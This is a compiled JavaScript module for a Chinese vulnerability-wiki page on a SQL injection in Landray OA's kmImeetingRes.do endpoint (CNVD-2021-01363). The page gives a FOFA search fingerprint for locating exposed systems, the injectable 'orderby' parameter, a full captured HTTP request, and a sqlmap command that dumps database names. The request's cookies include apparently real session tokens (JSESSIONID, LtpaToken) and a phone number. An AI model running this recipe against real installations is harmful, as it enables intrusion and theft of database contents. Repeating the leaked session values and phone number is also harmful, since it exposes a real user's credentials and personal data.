import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{o as s,c as n,e as p}from"./app-58e4a7d6.js";const e={},o=p(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>深圳市蓝凌软件股份有限公司数字OA(EKP)存在SQL注入漏洞。攻击者可利用漏洞获取数据库敏感信息。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>蓝凌OA
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;Landray-OA系统&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>存在SQL注入的 Url为,这里拿官方的演示站点演示漏洞过程</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>https://xxx.xxx.xxx.xxx/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&amp;method=listUse&amp;orderby=1&amp;ordertype=down&amp;s_ajax=true
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>其中存在SQL注入的参数为 <strong>ordeby</strong> ， 数据包如下</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>GET <span class="token operator">/</span>km<span class="token operator">/</span>imeeting<span class="token operator">/</span>km_imeeting_res<span class="token operator">/</span>kmImeetingRes<span class="token punctuation">.</span><span class="token keyword">do</span>?contentType<span class="token operator">=</span>json<span class="token operator">&amp;</span>method<span class="token operator">=</span>listUse<span class="token operator">&amp;</span>orderby<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>ordertype<span class="token operator">=</span>down<span class="token operator">&amp;</span>s_ajax<span class="token operator">=</span><span class="token boolean">true</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host: xxx<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx
Connection: <span class="token keyword">close</span>
Pragma: <span class="token keyword">no</span><span class="token operator">-</span>cache
Cache<span class="token operator">-</span>Control: <span class="token keyword">no</span><span class="token operator">-</span>cache
sec<span class="token operator">-</span>ch<span class="token operator">-</span>ua: <span class="token string">&quot;Google Chrome&quot;</span><span class="token punctuation">;</span>v<span class="token operator">=</span><span class="token string">&quot;89&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Chromium&quot;</span><span class="token punctuation">;</span>v<span class="token operator">=</span><span class="token string">&quot;89&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;;Not A Brand&quot;</span><span class="token punctuation">;</span>v<span class="token operator">=</span><span class="token string">&quot;99&quot;</span>
sec<span class="token operator">-</span>ch<span class="token operator">-</span>ua<span class="token operator">-</span>mobile: ?<span class="token number">0</span>
Upgrade<span class="token operator">-</span>Insecure<span class="token operator">-</span>Requests: <span class="token number">1</span>
<span class="token keyword">User</span><span class="token operator">-</span>Agent: Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> <span class="token operator">like</span> Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">89.0</span><span class="token number">.4389</span><span class="token number">.90</span> Safari<span class="token operator">/</span><span class="token number">537.36</span>
Accept: <span class="token keyword">text</span><span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>application<span class="token operator">/</span>signed<span class="token operator">-</span>exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>
Sec<span class="token operator">-</span><span class="token keyword">Fetch</span><span class="token operator">-</span>Site: <span class="token keyword">cross</span><span class="token operator">-</span>site
Sec<span class="token operator">-</span><span class="token keyword">Fetch</span><span class="token operator">-</span><span class="token keyword">Mode</span>: navigate
Sec<span class="token operator">-</span><span class="token keyword">Fetch</span><span class="token operator">-</span><span class="token keyword">User</span>: ?<span class="token number">1</span>
Sec<span class="token operator">-</span><span class="token keyword">Fetch</span><span class="token operator">-</span>Dest: document
Accept<span class="token operator">-</span>Encoding: gzip<span class="token punctuation">,</span> deflate
Accept<span class="token operator">-</span><span class="token keyword">Language</span>: zh<span class="token operator">-</span>CN<span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>en<span class="token operator">-</span>US<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>en<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.7</span><span class="token punctuation">,</span>zh<span class="token operator">-</span>TW<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.6</span>
Cookie: UM_distinctid<span class="token operator">=</span><span class="token number">1785</span>f7392888e1<span class="token operator">-</span><span class="token number">02</span>ece8c7e9a996<span class="token operator">-</span><span class="token number">5771031</span><span class="token operator">-</span><span class="token number">1</span>fa400<span class="token operator">-</span><span class="token number">1785</span>f73928943d<span class="token punctuation">;</span> landray_danyuan<span class="token operator">=</span><span class="token boolean">null</span><span class="token punctuation">;</span> landray_guanjianci<span class="token operator">=</span><span class="token boolean">null</span><span class="token punctuation">;</span> landray_sorce<span class="token operator">=</span>baidupinzhuanwy<span class="token punctuation">;</span> landray_jihua<span class="token operator">=</span><span class="token boolean">null</span><span class="token punctuation">;</span> JSESSIONID<span class="token operator">=</span><span class="token number">232</span>B6933CF33B5422F9D2649739D48FE<span class="token punctuation">;</span> Hm_lvt_223eecc93377a093d4111a2d7ea28f51<span class="token operator">=</span><span class="token number">1616509114</span><span class="token punctuation">,</span><span class="token number">1616566341</span><span class="token punctuation">,</span><span class="token number">1616566350</span><span class="token punctuation">;</span> Hm_lpvt_223eecc93377a093d4111a2d7ea28f51<span class="token operator">=</span><span class="token number">1616566350</span><span class="token punctuation">;</span> Hm_lvt_d14cb406f01f8101884d7cf81981d8bb<span class="token operator">=</span><span class="token number">1616509114</span><span class="token punctuation">,</span><span class="token number">1616566341</span><span class="token punctuation">,</span><span class="token number">1616566350</span><span class="token punctuation">;</span> Hm_lpvt_d14cb406f01f8101884d7cf81981d8bb<span class="token operator">=</span><span class="token number">1616566507</span><span class="token punctuation">;</span> Hm_lvt_95f4f43e7aa1fe68a51c44ae4eed925d<span class="token operator">=</span><span class="token number">1616509872</span><span class="token punctuation">,</span><span class="token number">1616509969</span><span class="token punctuation">,</span><span class="token number">1616509973</span><span class="token punctuation">,</span><span class="token number">1616566507</span><span class="token punctuation">;</span> Hm_lpvt_95f4f43e7aa1fe68a51c44ae4eed925d<span class="token operator">=</span><span class="token number">1616566507</span><span class="token punctuation">;</span> Hm_lvt_22f1fea4412727d23e6a998a4b46f2ab<span class="token operator">=</span><span class="token number">1616509872</span><span class="token punctuation">,</span><span class="token number">1616509969</span><span class="token punctuation">,</span><span class="token number">1616509973</span><span class="token punctuation">,</span><span class="token number">1616566507</span><span class="token punctuation">;</span> Hm_lpvt_22f1fea4412727d23e6a998a4b46f2ab<span class="token operator">=</span><span class="token number">1616566507</span><span class="token punctuation">;</span> fd_name<span class="token operator">=</span><span class="token operator">%</span>E5<span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">8</span>A<span class="token operator">%</span>E7<span class="token operator">%</span><span class="token number">9</span>A<span class="token operator">%</span><span class="token number">84</span><span class="token operator">%</span>E5<span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span><span class="token number">88</span><span class="token punctuation">;</span> fd_id<span class="token operator">=</span><span class="token number">1785</span>f817dd0f5a4beaa482646cb9a2d8<span class="token punctuation">;</span> nc_phone<span class="token operator">=</span><span class="token number">15572002383</span><span class="token punctuation">;</span> j_lang<span class="token operator">=</span>zh<span class="token operator">-</span>CN<span class="token punctuation">;</span> LtpaToken<span class="token operator">=</span>AAECAzYwNUFEOEZBNjA1QjgxQkFsdW9stJ5e1pcW1hgQi3cOa0iEyAhdZZs<span class="token operator">=</span><span class="token punctuation">;</span> Hm_lvt_95cec2a2f107db33ad817ed8e4a3073b<span class="token operator">=</span><span class="token number">1616510026</span><span class="token punctuation">,</span><span class="token number">1616566523</span><span class="token punctuation">;</span> Hm_lpvt_95cec2a2f107db33ad817ed8e4a3073b<span class="token operator">=</span><span class="token number">1616566523</span><span class="token punctuation">;</span> add_customer<span class="token operator">=</span><span class="token number">0</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>保存为文件，使用 Sqlmap 跑一下注入</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>sqlmap -r sql.txt -p orderby --dbs
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202090127479.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="感谢名单" tabindex="-1"><a class="header-anchor" href="#感谢名单" aria-hidden="true">#</a> 感谢名单</h2><p>感谢 @Miaòa 师傅的投稿</p>`,16),t=[o];function c(r,l){return s(),n("div",null,t)}const i=a(e,[["render",c],["__file","蓝凌OA kmImeetingRes.do 后台SQL注入漏洞 CNVD-2021-01363.html.vue"]]);export{i as default};
